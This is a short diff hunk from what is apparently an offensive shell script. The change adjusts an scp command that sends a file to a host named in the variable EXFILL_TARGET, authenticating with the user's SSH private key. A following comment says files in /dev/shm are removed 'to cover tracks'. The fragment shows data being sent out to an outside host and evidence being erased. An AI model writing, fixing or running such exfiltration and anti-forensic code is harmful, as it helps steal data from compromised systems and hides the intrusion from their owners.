@@ -70,7 +70,7 @@ for i in {1..4}; do
 done
 
 if [ -f "$FILE" ]; then
-  /usr/bin/scp -i $HOMEDIR/.ssh/id_rsa $FILE $EXFILL_TARGET:  
+  /usr/bin/scp -i $HOMEDIR/.ssh/id_rsa $FILE $SSH_USER@$EXFILL_TARGET:  
 fi
 
 # Remove all files from /dev/shm to cover tracks.
